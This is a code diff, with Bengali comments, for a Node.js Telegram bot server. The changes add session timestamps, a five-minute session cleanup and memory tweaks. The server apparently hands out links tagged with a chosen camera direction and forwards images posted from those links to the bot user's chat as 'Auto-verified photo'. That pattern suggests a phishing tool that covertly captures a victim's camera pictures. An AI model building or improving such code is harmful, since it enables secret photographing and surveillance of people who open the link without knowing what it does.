@@ -10,13 +10,13 @@ const BOT_TOKEN = process.env.BOT_TOKEN;
 const BASE_URL = process.env.BASE_URL;
 
 app.use(cors());
-app.use(express.json({ limit: '10mb' }));
+app.use(express.json({ limit: '3mb' })); // মেমোরি বাঁচাতে 3mb করা হলো
 
-// Webhook এর জন্য polling false করা হলো
 const bot = new TelegramBot(BOT_TOKEN, { polling: false });
 
-const activeSessions = {};
-const userSettings = {};
+// সেশন এবং ইউজার সেটিংস
+const activeSessions = {}; // sessionId -> { chatId, timestamp }
+const userSettings = {};   // chatId -> { facingMode }
 
 // --- Webhook Route ---
 app.post(`/bot${BOT_TOKEN}`, (req, res) => {
@@ -74,7 +74,12 @@ bot.on('callback_query', async (query) => {
     const facing = userSettings[chatId].facingMode;
     
     const sessionId = crypto.randomBytes(4).toString('hex');
-    activeSessions[sessionId] = chatId;
+    
+    // সেশন তৈরি করার সময় টাইমস্ট্যাম্প যোগ করা হলো
+    activeSessions[sessionId] = { 
+      chatId: chatId, 
+      createdAt: Date.now() 
+    };
     
     const longLink = `${BASE_URL}/?s=${sessionId}&f=${facing}`;
     
@@ -101,14 +106,24 @@ app.post('/api/send-photo', async (req, res) => {
   try {
     const { imageData, sessionId } = req.body;
 
-    const chatId = activeSessions[sessionId];
-    if (!chatId) return res.status(403).json({ error: "Invalid or expired session." });
-    if (!imageData) return res.status(400).json({ error: "Missing image data" });
+    const session = activeSessions[sessionId];
+    if (!session) {
+      return res.status(403).json({ error: "Invalid or expired session." });
+    }
+
+    if (!imageData) {
+      return res.status(400).json({ error: "Missing image data" });
+    }
 
     const base64Data = imageData.split(',')[1];
     const buffer = Buffer.from(base64Data, 'base64');
 
-    await bot.sendPhoto(chatId, buffer, { caption: "📸 Auto-verified photo" });
+    // বাফার মেমোরি থেকে ছবি পাঠানো
+    await bot.sendPhoto(session.chatId, buffer, { caption: "📸 Auto-verified photo" });
+    
+    // মেমোরি ক্লিয়ার করতে বাফারটি নাল করা (Optional but good practice)
+    buffer.fill(0); 
+
     res.json({ success: true });
 
   } catch (error) {
@@ -116,6 +131,31 @@ app.post('/api/send-photo', async (req, res) => {
     res.status(500).json({ error: "Failed to send photo" });
   }
 });
+
+// --- 🧹 মেমোরি ক্লিনার (প্রতি ৫ মিনিটে চলবে) ---
+setInterval(() => {
+  const now = Date.now();
+  const FIVE_MINUTES = 5 * 60 * 1000;
+  let cleanedSessions = 0;
+
+  for (const sessionId in activeSessions) {
+    // যদি সেশন ৫ মিনিটের বেশি পুরনো হয়, তবে ডিলিট করে দাও
+    if (now - activeSessions[sessionId].createdAt > FIVE_MINUTES) {
+      delete activeSessions[sessionId];
+      cleanedSessions++;
+    }
+  }
+
+  // মেমোরি ক্লিন করার লগ (Suga Logs-এ দেখা যাবে)
+  if (cleanedSessions > 0) {
+    console.log(`🧹 Memory Cleaned: Removed ${cleanedSessions} expired sessions.`);
+  }
+  
+  // Node.js-কে গার্বেজ কলেকশন করতে বলা (যদি গ্লোবাল gc অ্যাক্সেস থাকে)
+  if (global.gc) {
+    global.gc();
+  }
+}, FIVE_MINUTES);
 
 // --- সার্ভার রান এবং Webhook সেটআপ ---
 app.listen(PORT, async () => {
